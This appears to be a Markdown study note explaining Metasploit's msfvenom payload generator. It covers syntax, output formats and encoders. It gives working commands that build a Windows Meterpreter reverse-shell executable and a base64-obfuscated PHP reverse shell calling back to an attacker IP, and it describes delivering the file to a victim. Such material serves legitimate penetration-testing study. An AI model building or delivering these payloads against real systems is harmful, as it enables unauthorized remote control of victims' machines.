## 🔹 What msfvenom Does

- `msfvenom` is the **payload generator** tool in Metasploit.
- It creates a **standalone file or code snippet** that can be delivered to a target.
- You choose:
    - **Payload type** (`-p`) → what the payload will do (reverse shell, bind shell, Meterpreter, etc.).
    - **Options** (like `LHOST`, `LPORT`, `RPORT`) → connection details.
    - **Format** (`-f`) → how the payload is packaged (exe, elf, raw, php, etc.).
    - **Output** (`>` redirection) → where to save the payload file.

---

## 🔹 Basic Syntax

```bash
msfvenom -p <payload> [options] -f <format> > <filename>
```

### Example: Windows Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.19 LPORT=4444 -f exe > shell.exe
```

- Payload: Windows Meterpreter reverse TCP.
- Options: Attacker IP and port.
- Format: Windows executable.
- Output: `shell.exe` file.

---

## 🔹 Supported Formats

You can list all formats:

```bash
msfvenom --list formats
```

Common ones:

- `exe` → Windows executable
- `elf` → Linux binary
- `apk` → Android app
- `raw` → plain shellcode or script (PHP, Python, etc.)

---

## 🔹 Encoders (Optional)

You can encode payloads to obfuscate them:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.19 LPORT=7777 -f raw -e php/base64 > shell.php
```

- `-e php/base64` → encodes payload in Base64.
- Still works the same, but harder to detect or blocked by bad characters.

---

## 🔹 Key Point

- **msfvenom only builds the payload**.
- It does not listen or catch connections — that’s the handler’s job.
- Think of msfvenom as the “payload factory” that outputs the weaponized file.

---

⚡ In short:  
👉 `msfvenom` = payload creation tool.  
👉 You define payload type, options, format, and output file.  
👉 The result is a file you deliver to the victim.